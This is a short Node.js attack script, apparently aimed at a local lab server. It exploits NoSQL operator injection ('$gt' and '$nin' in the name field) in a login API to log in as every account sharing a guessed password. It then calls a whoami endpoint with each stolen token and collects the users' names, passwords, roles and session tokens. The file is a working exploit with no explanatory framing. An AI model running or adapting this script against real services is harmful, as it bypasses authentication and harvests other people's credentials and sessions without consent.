const fetch = require('node-fetch')

const passwordToTest = 'test'
let foundUsers = []

async function start() {
    await fetchUsers()
    console.log('\n-------------------------\n')
    console.log(foundUsers)
    console.log(`Found ${foundUsers.length} users`)
}

async function fetchUsers() {
    while(true) {
        const foundNames = foundUsers.map(user =>  user.name )
        console.log(foundNames)
        const header = {
            method: 'POST',
            headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                name: { "$gt":"", "$nin": foundNames }, 
                password: passwordToTest })
        }
    
        const res = await fetch('http://localhost:5000/api/users/login', header)
        if (res.status == 200) {
            const json = await res.json()
            await addUserDetails(json.token)
        } else {
            return
        }
    }
}

async function addUserDetails(token) {
    const header = {
        method: 'GET',
        headers: {
            cookie: `token=${token}`
        },
    }
    const res = await fetch('http://localhost:5000/api/users/whoami', header)
    const json = await res.json()
    foundUsers.push({
        name: json.name, 
        password: json.password, 
        role: json.role,
        token: token})   
}

start()
